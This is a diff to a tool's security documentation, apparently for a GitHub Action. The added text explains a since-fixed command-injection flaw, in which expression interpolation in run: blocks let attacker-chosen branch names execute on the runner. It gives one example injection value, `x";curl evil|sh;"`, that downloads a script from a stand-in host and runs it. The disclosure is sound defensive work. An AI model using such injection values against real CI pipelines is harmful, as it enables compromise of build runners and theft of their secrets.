@@ -23,6 +23,10 @@ The session ledger records command strings from `Bash` tool calls in order to no
 
 The GitHub Action needs `contents: read`, and `security-events: write` only if you use `upload-sarif`. It does not need a token of any other kind. Nothing leaves the runner.
 
+Every input reaches the shell through `env:` and is read as a quoted variable. This matters because a `${{ }}` expression inside a `run:` block is pasted in as source text before a shell exists, so a value like `x";curl evil|sh;"` would run. Until v0.4.1 three steps did interpolate directly, and a caller passing an attacker-influenced ref — `base: ${{ github.event.pull_request.head.ref }}` is an ordinary thing to write, and git permits `;`, `$`, `` ` `` and quotes in branch names — could have executed arbitrary commands on the runner. `tests/packaging.test.js` now fails the build if any `run:` block in `action.yml` interpolates an expression again.
+
+If you pass `base` yourself, it is still your value to trust: witness hands it to `git`, so a ref you accepted from an untrusted source is a ref `git` will act on.
+
 ## Hooks cannot break your session
 
 Every hook is advisory by construction and defensive by implementation: stdin parsing times out, malformed input is ignored, state writes are best-effort, and `EPIPE` is swallowed. `tests/hooks.test.js` asserts that every hook survives empty and malformed stdin without hanging or crashing.
